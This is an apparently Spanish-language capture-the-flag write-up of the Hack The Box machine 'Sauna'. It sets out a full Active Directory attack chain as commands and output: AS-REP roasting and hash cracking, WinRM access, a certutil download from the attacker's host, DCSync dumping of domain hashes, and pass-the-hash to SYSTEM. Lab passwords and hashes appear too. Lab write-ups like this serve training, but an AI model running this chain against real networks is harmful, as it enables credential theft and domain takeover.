@@ -1,0 +1,140 @@
+# 10.10.10.175 - Sauna
+-----------------------
+
+```bash
+└─$ portscan.sh 10.10.10.175
+53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389
+
+└─$ nmap -sCV 10.10.10.175 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -vvv
+PORT     STATE SERVICE       REASON  VERSION
+53/tcp   open  domain        syn-ack Simple DNS Plus
+80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-title: Egotistical Bank :: Home
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-01-18 18:06:06Z)
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack
+464/tcp  open  kpasswd5?     syn-ack
+593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack
+3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+(...)
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+
+```bash
+└─$ nxc smb 10.10.10.175 -u '' -p ''
+SMB   10.10.10.175    445    SAUNA   [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB   10.10.10.175    445    SAUNA   [+] EGOTISTICAL-BANK.LOCAL\:
+```
+Como obtenemos el nombre de dominio, lo relacionamos en el `/etc/hosts` a su IP 
+(`echo -e "egotistical-bank.local\t10.10.10.175" >> /etc/hosts `)
+
+```bash
+└─$ whatweb http://10.10.10.175
+http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
+
+└─$ wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.175/FUZZ.html
+000000001:   200        683 L    1813 W     32797 Ch    "index"                                               
+000000012:   200        640 L    1767 W     30954 Ch    "about"                                               
+000000011:   200        325 L    770 W      15634 Ch    "contact"                                             
+000000018:   200        470 L    1279 W     24695 Ch    "blog"
+```
+
+En la parte de about, podemos ver una serie de nombres, que podemos filtar con "curl"
+```bash
+└─$ curl -s http://10.10.10.175/about.html | html2text | grep -B 7 "Meet The Team" | grep -v "*"
+Fergus Smith
+Hugo Bear
+Steven Kerb
+Shaun Coins
+Bowie Taylor
+Sophie Driver
+
+└─$ curl -s http://10.10.10.175/about.html | html2text | grep -B 7 "Meet The Team" | grep -v "*" > users.txt
+```
+Estos nombres se pueden adaptar a diferentes formatos con "username-anarchy"
+```bash
+└─$ git clone https://github.com/urbanadventurer/username-anarchy; cd username-anarchy
+
+└─$ ./username-anarchy --input-file ../users.txt --select-format first,flast,first.last,firstl | sponge ../users.txt
+```
+
+Con estos usuarios, podemos intentar consguir algun hash por kerberos, primero enumeraremos los usaurios existentes con kerbrute
+y luego extraeremos un TGT con `impacket-GetNPUsers`, de ahí lo meteremos en el archivo `hash`
+
+```bash
+└─$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt | grep "+"
+2024/02/11 12:33:51 >  [+] VALID USERNAME:	fsmith@egotistical-bank.local
+
+└─$ impacket-GetNPUsers egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -no-pass | grep "krb" | tee hash             
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:9632fe062e2800fcfbb0583814863356$b2ae8733bf84df603589d3ab9fb91008b438cb27b17470780145acd82b00f02bc1cd5bf2cd9e7dbd07f465020e81068836465d33eca37c32e7803f6cd77f4d16f1db68c51ccf56eb8908c169cf2ec075828e5d787cdead5e09b88aaae7c84ef84c86da361eaed4faa60585933800af741bbcf9c15fb3869d4f70f43bded0eb4235ea10501347ad1a7bb1dd13d8423b41484aeaf4c7b25793a21ad083215f0b6d819fbcb15f3d5f99e2f6dfd76b263bc6e7b36e18340388802542210e9c406f8f5f62334164f9e99405fa4c69241106e02740b56de6101c68d755f4b6876a606f14e8c4be8c65672aa1f9952cfb3a598128a98db929b039e896fade1d77164b38
+
+└─$ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+(...)
+
+└─$ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --show
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a6c57a88e533d10(...):Thestrokes23
+```
+
+Comprobaremos si las credenciales son válidas, tanto por smb como por winrm. Resulta que sale por winrm `Pwn3d!` lo que
+significa que nuestro usaurio esta bajo el grupo `Remote Management Users`, por tanto puede establecer una sesión por winrm.
+```bash
+└─$ nxc smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' 
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
+
+└─$ nxc winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
+WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
+
+└─$ evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
+```
+
+Subimos una herramienta de enumeracion windows, por ejemplo [esta](https://raw.githubusercontent.com/jessica-diaz-ciber/Pentesting-tools/main/win_enum.bat)
+
+```bash
+*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -f -urlcache -split http://10.10.14.10/win_enum.bat
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> .\win_enum.bat
+Credenciales
+------------------------
+"[Autologon]"
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+```
+
+```bash
+└─$ bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -c All -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL
+INFO: Found AD domain: egotistical-bank.local
+INFO: Getting TGT for user
+
+└─$ zip info.zip *.json 
+```
+Encendemos bloodhound `sudo neo4j console` y `bloodhound &>/dev/null &; disown`
+
+```bash
+└─$ impacket-secretsdump -just-dc 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 -outputfile dcsync_hashes
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+
+└─$ crackmapexec smb 10.10.10.175 -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
+
+└─$ impacket-psexec egotistical-bank.local/Administrator@10.10.10.175 -hashes aad3b435b51404e(...)
+C:\Windows\system32> whoami
+nt authority\system
+```
+        
